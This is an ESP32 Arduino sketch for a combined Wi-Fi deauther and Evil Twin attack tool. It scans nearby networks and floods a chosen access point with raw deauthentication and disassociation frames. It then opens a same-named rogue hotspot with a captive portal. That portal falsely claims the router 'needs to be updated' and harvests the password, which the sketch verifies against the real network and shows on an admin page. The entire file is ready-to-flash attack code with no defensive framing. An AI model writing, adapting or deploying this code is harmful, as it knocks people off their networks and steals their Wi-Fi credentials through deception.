#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"          // ESP32 native: promiscuous + raw tx

/* ---------- Data structures ---------- */
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer webServer(80);         // ESP32: WebServer class

_Network _networks[16];
_Network _selectedNetwork;

bool hotspot_active = false;
bool deauthing_active = false;

String _correct = "";
String _tryPassword = "";

/* ---------- helpers ---------- */

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

/* Raw deauth/disassoc packet send (ESP32 equivalent of wifi_send_pkt_freedom) */
void sendDeauthFrames(const uint8_t* bssid) {
  // 26-byte management frame
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // addr1 (DA=broadcast)
    0, 0, 0, 0, 0, 0,                     // addr2 (SA) -> AP bssid
    0, 0, 0, 0, 0, 0,                     // addr3 (BSSID) -> AP bssid
    0x00, 0x00, 0x01, 0x00                // seq + reason(1)
  };

  memcpy(&deauthPacket[10], bssid, 6);   // source = target AP
  memcpy(&deauthPacket[16], bssid, 6);   // BSSID  = target AP

  // Deauthentication (0xC0)
  deauthPacket[0] = 0xC0;
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);

  // Disassociation (0xA0) - double tap like original
  deauthPacket[0] = 0xA0;
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void setDeauthActive(bool active) {
  deauthing_active = active;
  // Promiscuous mode is REQUIRED for raw 802.11 tx on ESP32.
  // Keep it ON only while deauthing so scan/connect still works otherwise.
  esp_wifi_set_promiscuous(active ? true : false);
}

/* ---------- scan ---------- */
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

/* ---------- captive portal HTML ---------- */
String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

/* Shared logic to select AP + handle buttons (used by both / and /admin) */
void processActions() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start")      setDeauthActive(true);
    else if (webServer.arg("deauth") == "stop")  setDeauthActive(false);
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      WiFi.softAP("M1z23R", "deauther");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
  }
}

String buildTableHTML() {
  String _html = _tempHTML;

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") break;
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" +
             bytesToStr(_networks[i].bssid, 6) + "</td><td>" +
             String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" +
             bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6))
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    else
      _html += "<button>Select</button></form></td></tr>";
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }

  if (_selectedNetwork.ssid == "") _html.replace("{disabled}", " disabled");
  else                             _html.replace("{disabled}", "");

  _html += "</table>";

  if (_correct != "") _html += "</br><h3>" + _correct + "</h3>";

  _html += "</div></body></html>";
  return _html;
}

/* ---------- HTTP handlers ---------- */
void handleIndex() {
  processActions();

  if (hotspot_active == false) {
    webServer.send(200, "text/html", buildTableHTML());
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      // ESP32 WiFi.begin also supports (ssid, pass, channel, bssid)
      WiFi.begin(_selectedNetwork.ssid.c_str(),
                 webServer.arg("password").c_str(),
                 _selectedNetwork.ch,
                 _selectedNetwork.bssid);
      webServer.send(200, "text/html",
        "<!DOCTYPE html><html><script>setTimeout(function(){window.location.href='/result';},15000);</script>"
        "</head><body><h2>Updating, please wait...</h2></body></html>");
    } else {
      webServer.send(200, "text/html",
        "<!DOCTYPE html><html><body><h2>Router '" + _selectedNetwork.ssid +
        "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>"
        "<input type='text' id='password' name='password' value='' minlength='8'><br>"
        "<input type='submit' value='Submit'></form></body></html>");
    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html",
      "<html><head><script>setTimeout(function(){window.location.href='/';},3000);</script>"
      "<meta name='viewport' content='initial-scale=1.0,width=device-width'>"
      "<body><h2>Wrong Password</h2><p>Please, try again.</p></body></html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html",
      "<html><head><meta name='viewport' content='initial-scale=1.0,width=device-width'>"
      "<body><h2>Good password</h2></body></html>");
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAP("M1z23R", "deauther");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

    _correct = "Successfully got password for: " + _selectedNetwork.ssid +
               " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

void handleAdmin() {
  processActions();
  webServer.send(200, "text/html", buildTableHTML());
}

/* ---------- setup / loop ---------- */
void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("M1z23R", "deauther");
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  performScan();   // pehla scan setup me hi
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && (millis() - deauth_now) >= 1000) {
    // Promiscuous chahiye to inject karne ke liye
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
    delay(100);                       // channel settle hone do
    sendDeauthFrames(_selectedNetwork.bssid);
    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    Serial.println(WiFi.status() == WL_CONNECTED ? "GOOD" : "BAD");
    wifinow = millis();
  }
}